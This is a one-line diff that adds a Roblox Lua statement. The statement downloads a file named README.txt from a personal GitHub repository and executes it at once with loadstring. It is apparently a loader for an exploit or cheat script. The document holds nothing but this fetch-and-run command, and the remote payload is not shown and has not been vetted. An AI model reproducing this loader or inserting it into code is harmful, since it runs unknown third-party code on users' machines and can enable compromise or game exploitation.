@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pedrinn007x5/Darkzinn/refs/heads/main/README.txt"))()
